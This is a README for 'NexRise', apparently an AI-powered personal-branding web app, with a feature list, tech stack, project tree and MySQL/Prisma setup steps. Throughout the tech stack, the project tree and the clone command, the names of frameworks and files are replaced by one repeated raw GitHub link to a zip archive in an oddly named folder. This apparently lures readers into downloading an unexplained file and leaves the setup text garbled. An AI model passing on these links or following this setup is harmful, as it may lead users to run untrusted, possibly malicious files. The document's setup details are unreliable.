# 📈 NexRise - AI-Powered Personal Branding Assistant

NexRise is an AI-powered platform designed to help users build and manage their personal brand. It provides AI-generated content, a roadmap for personal growth, and various branding tools.

## 🚀 Features
- AI Content Generator
- Personalized Branding Roadmap
- Interactive User Dashboard
- Secure Authentication System
- Responsive and Modern UI/UX

## 🛠️ Tech Stack
- **Frontend**: https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip, TypeScript, Tailwind CSS
- **Backend**: https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip, Prisma ORM
- **Database**: MySQL (via Prisma)
- **Authentication**: https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip
- **State Management**: Context API

## 📂 Project Structure
```
NexRise/
│── prisma/          # Prisma schema & migrations
│── public/          # Static assets
│── src/
│   ├── components/  # Reusable UI components
│   ├── pages/       # https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip pages & routing
│   ├── lib/         # Utility functions
│   ├── styles/      # Global styles
│── .env             # Environment variables
│── https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip     # Dependencies & scripts
│── https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip # Prisma database schema
```

## 🛠️ Setup Instructions
### 1️⃣ Clone the Repository
```sh
git clone https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip
cd NexRise
```

### 2️⃣ Install Dependencies
```sh
yarn install  # or npm install
```

### 3️⃣ Set Up Environment Variables
Create a `.env` file and configure the database connection:
```
DATABASE_URL="mysql://root:root@localhost:3306/nexrise"
GROQ_API_KEY="YOUR_GROQ_API_KEY"
RAPID_API_KEY="YOUR_RAPID_API_KEY"
```

### 4️⃣ Set Up MySQL with Prisma
```sh
npx prisma migrate dev --name init
npx prisma generate
```

### 5️⃣ Run the Development Server
```sh
yarn dev  # or npm run dev
```

## 🗃️ Database Management
Prisma provides easy-to-use commands for database migrations and management:
```sh
npx prisma studio  # Open database GUI
npx prisma migrate dev --name update  # Apply migrations
```

## 🧑‍💻 Contributing
1. Fork the repository
2. Create a new feature branch (`git checkout -b feature-name`)
3. Commit your changes (`git commit -m 'Added a new feature'`)
4. Push to the branch (`git push origin feature-name`)
5. Open a pull request


---
💡 **Need Help?** Feel free to create an issue or reach out!

